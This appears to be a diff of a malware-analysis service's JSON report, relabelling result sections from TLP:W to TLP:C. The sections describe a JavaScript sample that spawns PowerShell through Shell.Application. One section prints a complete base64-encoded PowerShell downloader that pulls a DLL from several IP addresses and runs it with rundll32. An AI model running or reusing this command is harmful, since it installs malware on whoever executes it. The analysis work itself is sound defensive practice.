@@ -7,7 +7,7 @@
         "auto_collapse": false,
         "body": null,
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": null,
         "tags": {},
@@ -18,7 +18,7 @@
         "auto_collapse": false,
         "body": "JavaScript creates an ActiveXObject\n\t\tNew ActiveXObject: shell.application\n",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 1,
         "heuristic": {
           "attack_ids": [],
@@ -40,7 +40,7 @@
         "auto_collapse": false,
         "body": "JavaScript runs code via shell application\n\t\tShell.Application[9].shellexecute(\"powershell\", \"-encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQ...",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 1,
         "heuristic": {
           "attack_ids": [],
@@ -62,7 +62,7 @@
         "auto_collapse": false,
         "body": null,
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": {
           "attack_ids": [],
@@ -80,7 +80,7 @@
         "auto_collapse": false,
         "body": "powershell -encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMwA7ACQAUABvAGwAeQBwAGgAYQByAG0AYQBjAG8AbgBTAHQAZQByAHYAZQAgAD0AIAAoACIAaAB0AHQAcAA6AC8ALwAyADAAMwAuADkANgAuADEANwA3AC4AMQAyADEALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwAxADkANQAuADIAMAAuADEANwAuADEANAAyAC8AbABKAGsARABiAGQAcAAuAGQAYQB0AGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADMAMQAuADIAMAA0AC4AMQAxADQALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwA4ADcALgAyADMANgAuADEANAA2AC4AMQA2ADIALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwAxADUAMQAuADgAMAAuADUALgA1ADAALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwAxADMAOQAuADEAOAAwAC4AMgAwADkALgAyADAANgAvAGwASgBrAEQAYgBkAHAALgBkAGEAdAAiACkALgBzAHAAbABpAHQAKAAiACwAIgApADsAZgBvAHIAZQBhAGMAaAAgACgAJABkAG8AYwB1AG0AZQBuAHQAZQBkAFMAYQBiAGUAcgBpAG4AZwAgAGkAbgAgACQAUABvAGwAeQBwAGgAYQByAG0AYQBjAG8AbgBTAHQAZQByAHYAZQApACAAewB0AHIAeQAgAHsASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAJABkAG8AYwB1AG0AZQBuAHQAZQBkAFMAYQBiAGUAcgBpAG4AZwAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwAgADEANQAgAC0ATwAgACQAZQBuAHYAOgBUAEUATQBQAFwAVwBpAHQAaABlAHIAdABpAHAALgBkAGwAbAA7AGkAZgAgACgAKABHAGUAdAAtAEkAdABlAG0AIAAkAGUAbgB2ADoAVABFAE0AUABcAFcAaQB0AGgAZQByAHQAaQBwAC4AZABsAGwAKQAuAGwAZQBuAGcAdABoACAALQBnAGUAIAAxADAAMAAwADAAMAApACAAewBzAHQAYQByAHQAIAByAHUAbgBkAGwAbAAzADIAIAAkAGUAbgB2ADoAVABFAE0AUABcAFwAVwBpAHQAaABlAHIAdABpAHAALgBkAGwAbAAsAEcATAA3ADAAOwBiAHIAZQBhAGsAOwB9AH0AYwBhAHQAYwBoACAAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAAzADsAfQB9AA==\"",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 1,
         "heuristic": null,
         "tags": {
